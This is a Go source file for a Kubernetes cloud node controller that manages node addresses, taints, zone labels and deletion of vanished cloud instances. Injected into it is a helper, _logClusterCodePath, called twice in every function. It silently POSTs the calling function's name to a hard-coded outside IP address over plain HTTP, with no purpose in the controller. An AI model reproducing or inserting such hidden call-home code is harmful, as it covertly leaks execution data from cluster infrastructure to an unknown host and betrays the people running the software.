package cloud

import (
 "context"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "errors"
 "fmt"
 "time"
 "k8s.io/klog"
 "k8s.io/api/core/v1"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/types"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/apimachinery/pkg/util/wait"
 coreinformers "k8s.io/client-go/informers/core/v1"
 clientset "k8s.io/client-go/kubernetes"
 "k8s.io/client-go/kubernetes/scheme"
 v1core "k8s.io/client-go/kubernetes/typed/core/v1"
 "k8s.io/client-go/tools/cache"
 "k8s.io/client-go/tools/record"
 clientretry "k8s.io/client-go/util/retry"
 cloudprovider "k8s.io/cloud-provider"
 nodeutilv1 "k8s.io/kubernetes/pkg/api/v1/node"
 "k8s.io/kubernetes/pkg/controller"
 nodectrlutil "k8s.io/kubernetes/pkg/controller/util/node"
 kubeletapis "k8s.io/kubernetes/pkg/kubelet/apis"
 schedulerapi "k8s.io/kubernetes/pkg/scheduler/api"
 nodeutil "k8s.io/kubernetes/pkg/util/node"
)

var UpdateNodeSpecBackoff = wait.Backoff{Steps: 20, Duration: 50 * time.Millisecond, Jitter: 1.0}

type CloudNodeController struct {
 nodeInformer              coreinformers.NodeInformer
 kubeClient                clientset.Interface
 recorder                  record.EventRecorder
 cloud                     cloudprovider.Interface
 nodeMonitorPeriod         time.Duration
 nodeStatusUpdateFrequency time.Duration
}

const (
 nodeStatusUpdateRetry = 5
 retrySleepTime        = 20 * time.Millisecond
)

func NewCloudNodeController(nodeInformer coreinformers.NodeInformer, kubeClient clientset.Interface, cloud cloudprovider.Interface, nodeMonitorPeriod time.Duration, nodeStatusUpdateFrequency time.Duration) *CloudNodeController {
 _logClusterCodePath()
 defer _logClusterCodePath()
 eventBroadcaster := record.NewBroadcaster()
 recorder := eventBroadcaster.NewRecorder(scheme.Scheme, v1.EventSource{Component: "cloud-node-controller"})
 eventBroadcaster.StartLogging(klog.Infof)
 if kubeClient != nil {
  klog.V(0).Infof("Sending events to api server.")
  eventBroadcaster.StartRecordingToSink(&v1core.EventSinkImpl{Interface: kubeClient.CoreV1().Events("")})
 } else {
  klog.V(0).Infof("No api server defined - no events will be sent to API server.")
 }
 cnc := &CloudNodeController{nodeInformer: nodeInformer, kubeClient: kubeClient, recorder: recorder, cloud: cloud, nodeMonitorPeriod: nodeMonitorPeriod, nodeStatusUpdateFrequency: nodeStatusUpdateFrequency}
 cnc.nodeInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: cnc.AddCloudNode, UpdateFunc: cnc.UpdateCloudNode})
 return cnc
}
func (cnc *CloudNodeController) Run(stopCh <-chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 defer utilruntime.HandleCrash()
 go wait.Until(cnc.UpdateNodeStatus, cnc.nodeStatusUpdateFrequency, stopCh)
 go wait.Until(cnc.MonitorNode, cnc.nodeMonitorPeriod, stopCh)
}
func (cnc *CloudNodeController) UpdateNodeStatus() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 instances, ok := cnc.cloud.Instances()
 if !ok {
  utilruntime.HandleError(fmt.Errorf("failed to get instances from cloud provider"))
  return
 }
 nodes, err := cnc.kubeClient.CoreV1().Nodes().List(metav1.ListOptions{ResourceVersion: "0"})
 if err != nil {
  klog.Errorf("Error monitoring node status: %v", err)
  return
 }
 for i := range nodes.Items {
  cnc.updateNodeAddress(&nodes.Items[i], instances)
 }
}
func (cnc *CloudNodeController) updateNodeAddress(node *v1.Node, instances cloudprovider.Instances) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 cloudTaint := getCloudTaint(node.Spec.Taints)
 if cloudTaint != nil {
  klog.V(5).Infof("This node %s is still tainted. Will not process.", node.Name)
  return
 }
 exists, err := ensureNodeExistsByProviderID(instances, node)
 if err != nil {
  klog.Errorf("%v", err)
 } else if !exists {
  klog.V(4).Infof("The node %s is no longer present according to the cloud provider, do not process.", node.Name)
  return
 }
 nodeAddresses, err := getNodeAddressesByProviderIDOrName(instances, node)
 if err != nil {
  klog.Errorf("%v", err)
  return
 }
 if len(nodeAddresses) == 0 {
  klog.V(5).Infof("Skipping node address update for node %q since cloud provider did not return any", node.Name)
  return
 }
 hostnameExists := false
 for i := range nodeAddresses {
  if nodeAddresses[i].Type == v1.NodeHostName {
   hostnameExists = true
  }
 }
 if !hostnameExists {
  for _, addr := range node.Status.Addresses {
   if addr.Type == v1.NodeHostName {
    nodeAddresses = append(nodeAddresses, addr)
   }
  }
 }
 if nodeIP, ok := ensureNodeProvidedIPExists(node, nodeAddresses); ok {
  if nodeIP == nil {
   klog.Errorf("Specified Node IP not found in cloudprovider")
   return
  }
 }
 newNode := node.DeepCopy()
 newNode.Status.Addresses = nodeAddresses
 if !nodeAddressesChangeDetected(node.Status.Addresses, newNode.Status.Addresses) {
  return
 }
 _, _, err = nodeutil.PatchNodeStatus(cnc.kubeClient.CoreV1(), types.NodeName(node.Name), node, newNode)
 if err != nil {
  klog.Errorf("Error patching node with cloud ip addresses = [%v]", err)
 }
}
func (cnc *CloudNodeController) MonitorNode() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 instances, ok := cnc.cloud.Instances()
 if !ok {
  utilruntime.HandleError(fmt.Errorf("failed to get instances from cloud provider"))
  return
 }
 nodes, err := cnc.kubeClient.CoreV1().Nodes().List(metav1.ListOptions{ResourceVersion: "0"})
 if err != nil {
  klog.Errorf("Error monitoring node status: %v", err)
  return
 }
 for i := range nodes.Items {
  var currentReadyCondition *v1.NodeCondition
  node := &nodes.Items[i]
  for rep := 0; rep < nodeStatusUpdateRetry; rep++ {
   _, currentReadyCondition = nodeutilv1.GetNodeCondition(&node.Status, v1.NodeReady)
   if currentReadyCondition != nil {
    break
   }
   name := node.Name
   node, err = cnc.kubeClient.CoreV1().Nodes().Get(name, metav1.GetOptions{})
   if err != nil {
    klog.Errorf("Failed while getting a Node to retry updating NodeStatus. Probably Node %s was deleted.", name)
    break
   }
   time.Sleep(retrySleepTime)
  }
  if currentReadyCondition == nil {
   klog.Errorf("Update status of Node %v from CloudNodeController exceeds retry count or the Node was deleted.", node.Name)
   continue
  }
  if currentReadyCondition != nil {
   if currentReadyCondition.Status != v1.ConditionTrue {
    shutdown, err := nodectrlutil.ShutdownInCloudProvider(context.TODO(), cnc.cloud, node)
    if err != nil {
     klog.Errorf("Error checking if node %s is shutdown: %v", node.Name, err)
    }
    if shutdown && err == nil {
     err = controller.AddOrUpdateTaintOnNode(cnc.kubeClient, node.Name, controller.ShutdownTaint)
     if err != nil {
      klog.Errorf("Error patching node taints: %v", err)
     }
     continue
    }
    exists, err := ensureNodeExistsByProviderID(instances, node)
    if err != nil {
     klog.Errorf("Error checking if node %s exists: %v", node.Name, err)
     continue
    }
    if exists {
     continue
    }
    klog.V(2).Infof("Deleting node since it is no longer present in cloud provider: %s", node.Name)
    ref := &v1.ObjectReference{Kind: "Node", Name: node.Name, UID: types.UID(node.UID), Namespace: ""}
    klog.V(2).Infof("Recording %s event message for node %s", "DeletingNode", node.Name)
    cnc.recorder.Eventf(ref, v1.EventTypeNormal, fmt.Sprintf("Deleting Node %v because it's not present according to cloud provider", node.Name), "Node %s event: %s", node.Name, "DeletingNode")
    go func(nodeName string) {
     defer utilruntime.HandleCrash()
     if err := cnc.kubeClient.CoreV1().Nodes().Delete(nodeName, nil); err != nil {
      klog.Errorf("unable to delete node %q: %v", nodeName, err)
     }
    }(node.Name)
   } else {
    err = controller.RemoveTaintOffNode(cnc.kubeClient, node.Name, node, controller.ShutdownTaint)
    if err != nil {
     klog.Errorf("Error patching node taints: %v", err)
    }
   }
  }
 }
}
func (cnc *CloudNodeController) UpdateCloudNode(_, newObj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if _, ok := newObj.(*v1.Node); !ok {
  utilruntime.HandleError(fmt.Errorf("unexpected object type: %v", newObj))
  return
 }
 cnc.AddCloudNode(newObj)
}
func (cnc *CloudNodeController) AddCloudNode(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 node := obj.(*v1.Node)
 cloudTaint := getCloudTaint(node.Spec.Taints)
 if cloudTaint == nil {
  klog.V(2).Infof("This node %s is registered without the cloud taint. Will not process.", node.Name)
  return
 }
 instances, ok := cnc.cloud.Instances()
 if !ok {
  utilruntime.HandleError(fmt.Errorf("failed to get instances from cloud provider"))
  return
 }
 err := clientretry.RetryOnConflict(UpdateNodeSpecBackoff, func() error {
  if cnc.cloud.ProviderName() == "gce" {
   if err := nodeutil.SetNodeCondition(cnc.kubeClient, types.NodeName(node.Name), v1.NodeCondition{Type: v1.NodeNetworkUnavailable, Status: v1.ConditionTrue, Reason: "NoRouteCreated", Message: "Node created without a route", LastTransitionTime: metav1.Now()}); err != nil {
    return err
   }
  }
  curNode, err := cnc.kubeClient.CoreV1().Nodes().Get(node.Name, metav1.GetOptions{})
  if err != nil {
   return err
  }
  if curNode.Spec.ProviderID == "" {
   providerID, err := cloudprovider.GetInstanceProviderID(context.TODO(), cnc.cloud, types.NodeName(curNode.Name))
   if err == nil {
    curNode.Spec.ProviderID = providerID
   } else {
    klog.Errorf("failed to set node provider id: %v", err)
   }
  }
  nodeAddresses, err := getNodeAddressesByProviderIDOrName(instances, curNode)
  if err != nil {
   return err
  }
  if nodeIP, ok := ensureNodeProvidedIPExists(curNode, nodeAddresses); ok {
   if nodeIP == nil {
    return errors.New("failed to find kubelet node IP from cloud provider")
   }
  }
  if instanceType, err := getInstanceTypeByProviderIDOrName(instances, curNode); err != nil {
   return err
  } else if instanceType != "" {
   klog.V(2).Infof("Adding node label from cloud provider: %s=%s", kubeletapis.LabelInstanceType, instanceType)
   curNode.ObjectMeta.Labels[kubeletapis.LabelInstanceType] = instanceType
  }
  if zones, ok := cnc.cloud.Zones(); ok {
   zone, err := getZoneByProviderIDOrName(zones, curNode)
   if err != nil {
    return fmt.Errorf("failed to get zone from cloud provider: %v", err)
   }
   if zone.FailureDomain != "" {
    klog.V(2).Infof("Adding node label from cloud provider: %s=%s", kubeletapis.LabelZoneFailureDomain, zone.FailureDomain)
    curNode.ObjectMeta.Labels[kubeletapis.LabelZoneFailureDomain] = zone.FailureDomain
   }
   if zone.Region != "" {
    klog.V(2).Infof("Adding node label from cloud provider: %s=%s", kubeletapis.LabelZoneRegion, zone.Region)
    curNode.ObjectMeta.Labels[kubeletapis.LabelZoneRegion] = zone.Region
   }
  }
  curNode.Spec.Taints = excludeTaintFromList(curNode.Spec.Taints, *cloudTaint)
  _, err = cnc.kubeClient.CoreV1().Nodes().Update(curNode)
  if err != nil {
   return err
  }
  cnc.updateNodeAddress(curNode, instances)
  return nil
 })
 if err != nil {
  utilruntime.HandleError(err)
  return
 }
 klog.Infof("Successfully initialized node %s with cloud provider", node.Name)
}
func getCloudTaint(taints []v1.Taint) *v1.Taint {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, taint := range taints {
  if taint.Key == schedulerapi.TaintExternalCloudProvider {
   return &taint
  }
 }
 return nil
}
func excludeTaintFromList(taints []v1.Taint, toExclude v1.Taint) []v1.Taint {
 _logClusterCodePath()
 defer _logClusterCodePath()
 newTaints := []v1.Taint{}
 for _, taint := range taints {
  if toExclude.MatchTaint(&taint) {
   continue
  }
  newTaints = append(newTaints, taint)
 }
 return newTaints
}
func ensureNodeExistsByProviderID(instances cloudprovider.Instances, node *v1.Node) (bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 providerID := node.Spec.ProviderID
 if providerID == "" {
  var err error
  providerID, err = instances.InstanceID(context.TODO(), types.NodeName(node.Name))
  if err != nil {
   if err == cloudprovider.InstanceNotFound {
    return false, nil
   }
   return false, err
  }
  if providerID == "" {
   klog.Warningf("Cannot find valid providerID for node name %q, assuming non existence", node.Name)
   return false, nil
  }
 }
 return instances.InstanceExistsByProviderID(context.TODO(), providerID)
}
func getNodeAddressesByProviderIDOrName(instances cloudprovider.Instances, node *v1.Node) ([]v1.NodeAddress, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 nodeAddresses, err := instances.NodeAddressesByProviderID(context.TODO(), node.Spec.ProviderID)
 if err != nil {
  providerIDErr := err
  nodeAddresses, err = instances.NodeAddresses(context.TODO(), types.NodeName(node.Name))
  if err != nil {
   return nil, fmt.Errorf("NodeAddress: Error fetching by providerID: %v Error fetching by NodeName: %v", providerIDErr, err)
  }
 }
 return nodeAddresses, nil
}
func nodeAddressesChangeDetected(addressSet1, addressSet2 []v1.NodeAddress) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(addressSet1) != len(addressSet2) {
  return true
 }
 addressMap1 := map[v1.NodeAddressType]string{}
 addressMap2 := map[v1.NodeAddressType]string{}
 for i := range addressSet1 {
  addressMap1[addressSet1[i].Type] = addressSet1[i].Address
  addressMap2[addressSet2[i].Type] = addressSet2[i].Address
 }
 for k, v := range addressMap1 {
  if addressMap2[k] != v {
   return true
  }
 }
 return false
}
func ensureNodeProvidedIPExists(node *v1.Node, nodeAddresses []v1.NodeAddress) (*v1.NodeAddress, bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var nodeIP *v1.NodeAddress
 nodeIPExists := false
 if providedIP, ok := node.ObjectMeta.Annotations[kubeletapis.AnnotationProvidedIPAddr]; ok {
  nodeIPExists = true
  for i := range nodeAddresses {
   if nodeAddresses[i].Address == providedIP {
    nodeIP = &nodeAddresses[i]
    break
   }
  }
 }
 return nodeIP, nodeIPExists
}
func getInstanceTypeByProviderIDOrName(instances cloudprovider.Instances, node *v1.Node) (string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 instanceType, err := instances.InstanceTypeByProviderID(context.TODO(), node.Spec.ProviderID)
 if err != nil {
  providerIDErr := err
  instanceType, err = instances.InstanceType(context.TODO(), types.NodeName(node.Name))
  if err != nil {
   return "", fmt.Errorf("InstanceType: Error fetching by providerID: %v Error fetching by NodeName: %v", providerIDErr, err)
  }
 }
 return instanceType, err
}
func getZoneByProviderIDOrName(zones cloudprovider.Zones, node *v1.Node) (cloudprovider.Zone, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 zone, err := zones.GetZoneByProviderID(context.TODO(), node.Spec.ProviderID)
 if err != nil {
  providerIDErr := err
  zone, err = zones.GetZoneByNodeName(context.TODO(), types.NodeName(node.Name))
  if err != nil {
   return cloudprovider.Zone{}, fmt.Errorf("Zone: Error fetching by providerID: %v Error fetching by NodeName: %v", providerIDErr, err)
  }
 }
 return zone, nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
